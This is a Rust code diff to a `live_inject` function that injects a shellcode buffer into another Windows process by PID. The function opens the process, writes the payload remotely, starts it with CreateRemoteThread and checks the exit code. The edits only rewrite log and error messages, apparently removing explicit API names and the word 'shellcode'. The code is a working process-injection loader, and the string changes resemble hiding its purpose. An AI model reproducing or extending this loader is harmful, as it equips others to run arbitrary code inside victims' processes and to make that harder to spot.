@@ -18,10 +18,7 @@ pub fn live_inject(
     const INFINITE: u32 = 0xFFFFFFFF;
     const WAIT_OBJECT_0: u32 = 0;
 
-    log.step(format!(
-        "[1/6] OpenProcess(PID {}) — PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
-        pid
-    ));
+    log.step(format!("[1/6] Open target (PID {})", pid));
     let process_access = PROCESS_CREATE_THREAD
         | PROCESS_QUERY_INFORMATION
         | PROCESS_VM_OPERATION
@@ -29,16 +26,13 @@ pub fn live_inject(
         | PROCESS_VM_WRITE;
     let process = unsafe { resolve::OpenProcess(process_access, 0, pid) };
     if process.is_null() {
-        return Err("OpenProcess failed (check privileges — try from an elevated shell)".to_string());
+        return Err("process open failed (check privileges — try from an elevated shell)".to_string());
     }
 
     let size = shellcode.len();
     let base = write_remote_payload(process, shellcode, 6, log)?;
 
-    log.step(format!(
-        "[5/6] CreateRemoteThread — start at remote address {:#p}",
-        base
-    ));
+    log.step(format!("[5/6] Start remote thread at {:#p}", base));
     let mut thread_id: u32 = 0;
     let thread = unsafe {
         resolve::CreateRemoteThread(
@@ -54,18 +48,18 @@ pub fn live_inject(
     if thread.is_null() {
         free_remote(process, base, log);
         unsafe { resolve::CloseHandle(process) };
-        return Err("CreateRemoteThread failed".to_string());
+        return Err("remote thread creation failed".to_string());
     }
     log.info(format!("      remote thread started (TID {})", thread_id));
 
-    log.step("[6/6] WaitForSingleObject — waiting for remote thread to finish");
+    log.step("[6/6] Waiting for completion");
     let wait = unsafe { resolve::WaitForSingleObject(thread, INFINITE) };
     if wait != WAIT_OBJECT_0 {
         free_remote(process, base, log);
         unsafe { resolve::CloseHandle(thread) };
         unsafe { resolve::CloseHandle(process) };
         return Err(format!(
-            "WaitForSingleObject returned {} (expected WAIT_OBJECT_0)",
+            "wait returned {} (expected 0)",
             wait
         ));
     }
@@ -74,7 +68,7 @@ pub fn live_inject(
         free_remote(process, base, log);
         unsafe { resolve::CloseHandle(thread) };
         unsafe { resolve::CloseHandle(process) };
-        return Err("GetExitCodeThread failed".to_string());
+        return Err("exit code retrieval failed".to_string());
     }
     unsafe { resolve::CloseHandle(thread) };
     unsafe { resolve::CloseHandle(process) };
@@ -87,9 +81,9 @@ pub fn live_inject(
             "      remote thread CRASHED — exit code 0x{:X} (ACCESS_VIOLATION)",
             exit_code
         ));
-        log.error("      the shellcode hit an invalid memory access");
+        log.error("      invalid memory access");
         log.error(
-            "      the injection pipeline is OK (NOP payload works) — the payload is broken",
+            "      pipeline OK (NOP works) — payload is broken",
         );
     } else if exit_code >= 0xC0000000 {
         log.warning(format!(
@@ -103,7 +97,7 @@ pub fn live_inject(
         ));
     }
     log.info(format!(
-        "      shellcode remains at remote address {:#p} ({} bytes)",
+        "      payload at {:#p} ({} bytes)",
         base, size
     ));
     Ok(InjectionResult {
@@ -118,5 +112,5 @@ pub fn live_inject(
     _shellcode: &[u8],
     _log: &LogSink,
 ) -> Result<InjectionResult, String> {
-    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
+    Err("requires Windows".to_string())
 }
